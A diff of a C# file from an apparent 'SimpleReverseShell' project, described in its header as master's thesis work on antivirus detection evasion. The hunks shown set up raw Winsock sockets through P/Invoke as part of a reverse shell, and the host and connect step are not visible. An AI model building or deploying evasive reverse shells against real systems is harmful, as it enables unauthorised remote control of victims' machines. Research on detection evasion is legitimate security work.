@@ -1,20 +1,13 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Reflection.Metadata;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
-using static SimpleReverseShell.DllImportsBase;
-using static SimpleReverseShell.SimpleSysCallShell;
-
+﻿///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+/// This implementation is part of my master's thesis regarding antivirus detection evasion. 
+///  C Vorlage: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
+///  C# Beispiel für Structs: https://pastebin.com/twvGw030
+///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 namespace SimpleReverseShell
 {
-  // Vorlage für diese Implementierung: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
-  // C# Beispiel für Structs: https://pastebin.com/twvGw030
+  using System.Net.Sockets;
+  using System.Runtime.InteropServices;
+
   internal class SimpleSysCallShell : DllImportsBase
   {
     public void Start()
@@ -22,13 +15,7 @@ namespace SimpleReverseShell
       var wsa = new WSAData();
       var statusCode = WSAStartup((ushort)2.2, wsa);
 
-      if (statusCode != 0)
-      {
-        Console.WriteLine($"WSA Startup fail with statuscode {statusCode}");
-        throw new InvalidOperationException();
-      }
-
-      var protcolInfo = new WSAPROTOCOL_INFOA();
+      PrintLastError(nameof(WSAStartup));
 
       var sockAddrIn = new sockaddr_in();
       sockAddrIn.sin_family = 2;
@@ -45,8 +32,6 @@ namespace SimpleReverseShell
 
       var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
       PrintLastError(nameof(WSASocketA));
-
-      //StartListen(socket);
 
       var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
       Marshal.StructureToPtr(sockAddr, addrPointer, false);
